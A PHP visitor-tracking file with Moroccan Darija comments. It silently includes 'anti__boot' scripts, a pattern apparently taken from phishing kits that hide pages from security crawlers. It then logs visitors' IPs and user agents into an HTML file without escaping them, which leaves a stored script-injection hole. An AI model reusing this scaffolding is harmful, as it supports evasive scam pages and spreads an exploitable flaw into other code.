<?php

// Anti-bot protection: safe include bach ma yban warning ila fichier ma kaynch
$anti_files = [
    "../anti/anti__boot/anti1.php",
    "../anti/anti__boot/anti2.php",
    "../anti/anti__boot/anti3.php",
    "../anti/anti__boot/anti4.php",
    "../anti/anti__boot/anti5.php",
    "../anti/anti__boot/anti6.php",
    "../anti/anti__boot/anti7.php",
    "../anti/anti__boot/index.php"
];

// Loop bach n-include ghi les fichiers li mawjoudin (safe o bla warning)
foreach ($anti_files as $file) {
    if (file_exists($file)) {
        include $file;
    }
    // Ila ma kaynch → ma kaydir walo o ma kayban warning
}

// Ba9i l-code dyalk kifma howa (visitors + getOS + getBrowser + get_IP_address...)
function visitors() {
    $detect         = new BrowserDetection();
    $ip             = $_SERVER['REMOTE_ADDR'];
    $date           = date("Y-m-d H:i:s", time());
    $usragent       = $_SERVER['HTTP_USER_AGENT'];
    $browserName    = $detect->getName();
    $browserVer     = $detect->getVersion();
    $isMobile       = ($detect->isMobile()) ? 'Mobile' : 'Not mobile';
    $platformName   = $detect->getPlatform();
    $str = " <tr> <th scope='row'>$ip</th>  <td>$date</td> <td>$usragent</td> <td>[$isMobile] $browserName $browserVer </td> </tr>";
    file_put_contents('visitors.html', $str  , FILE_APPEND | LOCK_EX);
}

$user_agent = $_SERVER['HTTP_USER_AGENT'];
$ip = get_IP_address();
$OS = getOS();
$Browser = getBrowser();

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
        '/windows nt 10/i'      =>  'Windows 10',
        '/windows nt 6.3/i'     =>  'Windows 8.1',
        '/windows nt 6.2/i'     =>  'Windows 8',
        '/windows nt 6.1/i'     =>  'Windows 7',
        '/windows nt 6.0/i'     =>  'Windows Vista',
        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
        '/windows nt 5.1/i'     =>  'Windows XP',
        '/windows xp/i'         =>  'Windows XP',
        '/windows nt 5.0/i'     =>  'Windows 2000',
        '/windows me/i'         =>  'Windows ME',
        '/win98/i'              =>  'Windows 98',
        '/win95/i'              =>  'Windows 95',
        '/win16/i'              =>  'Windows 3.11',
        '/macintosh|mac os x/i' =>  'Mac OS X',
        '/mac_powerpc/i'        =>  'Mac OS 9',
        '/linux/i'              =>  'Linux',
        '/ubuntu/i'             =>  'Ubuntu',
        '/iphone/i'             =>  'iPhone',
        '/ipod/i'               =>  'iPod',
        '/ipad/i'               =>  'iPad',
        '/android/i'            =>  'Android',
        '/blackberry/i'         =>  'BlackBerry',
        '/webos/i'              =>  'Mobile'
    );
    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;
    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
        '/msie/i'      => 'Internet Explorer',
        '/firefox/i'   => 'Firefox',
        '/safari/i'    => 'Safari',
        '/chrome/i'    => 'Chrome',
        '/edge/i'      => 'Edge',
        '/opera/i'     => 'Opera',
        '/netscape/i'  => 'Netscape',
        '/maxthon/i'   => 'Maxthon',
        '/konqueror/i' => 'Konqueror',
        '/mobile/i'    => 'Handheld Browser'
    );
    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;
    return $browser;
}

function get_IP_address()
{
    foreach (array('HTTP_CLIENT_IP',
                   'HTTP_X_FORWARDED_FOR',
                   'HTTP_X_FORWARDED',
                   'HTTP_X_CLUSTER_CLIENT_IP',
                   'HTTP_FORWARDED_FOR',
                   'HTTP_FORWARDED',
                   'REMOTE_ADDR') as $key){
        if (array_key_exists($key, $_SERVER) === true){
            foreach (explode(',', $_SERVER[$key]) as $IPaddress){
                $IPaddress = trim($IPaddress);
                if (filter_var($IPaddress,
                               FILTER_VALIDATE_IP,
                               FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)
                    !== false) {
                    return $IPaddress;
                }
            }
        }
    }
}